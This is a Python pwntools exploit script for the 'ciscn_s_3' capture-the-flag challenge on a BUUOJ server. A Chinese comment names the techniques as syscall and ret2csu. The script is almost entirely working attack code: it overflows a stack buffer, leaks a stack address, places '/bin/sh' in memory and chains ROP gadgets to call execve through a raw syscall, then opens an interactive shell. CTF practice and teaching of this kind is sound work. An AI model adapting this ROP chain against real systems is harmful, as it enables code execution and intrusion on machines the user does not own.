# 看了一下，考的点是syscal系统调用和ret2csu，暂时超出我能力范围了...

from pwn import *

# 本地调试
if args.LOCAL:
    # context.terminal = ["wsl", "-c"]
    # io = process("./ciscn_s_3")

    io = gdb.debug("./ciscn_s_3")
    
    offset = 0x128
else:
    io = remote("node4.buuoj.cn", 27598)
    # context.log_level = 'debug'
    offset = 0x118

vuln_addr = 0x4004ed
syscall = 0x400517
pop_rdi_ret = 0x4005a3
mov_rax_59_ret = 0x4004e2
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059a
mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = 0x400580

payload1 = b'a'*0x10 + p64(vuln_addr)
io.sendline(payload1)

io.recv(0x20)

stack_addr = u64(io.recv(8))
binsh_addr = stack_addr - offset
io.recv(0x38)

payload2 = b'/bin/sh\x00'.ljust(0x10, b'a') + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
payload2 += p64(0)*2 + p64(binsh_addr+0x50) + p64(0)*3
payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12) + p64(mov_rax_59_ret)
payload2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(syscall)

io.sendline(payload2)
io.interactive()